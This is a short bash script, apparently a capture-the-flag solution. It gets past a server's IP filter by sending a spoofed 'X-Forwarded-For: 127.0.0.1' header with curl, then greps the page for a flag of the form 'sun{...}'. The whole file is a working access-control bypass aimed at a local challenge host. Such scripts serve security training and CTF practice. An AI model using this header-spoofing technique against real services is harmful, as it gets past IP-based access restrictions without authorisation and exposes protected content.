#!/bin/bash
# IP filter trusts the client X-Forwarded-For header; claim to be 127.0.0.1.
HOST="${URL:-${1:-http://127.0.0.1:18304}}"
curl -s -H "X-Forwarded-For: 127.0.0.1" "$HOST/" | grep -o 'sun{[^}]*}' | head -1
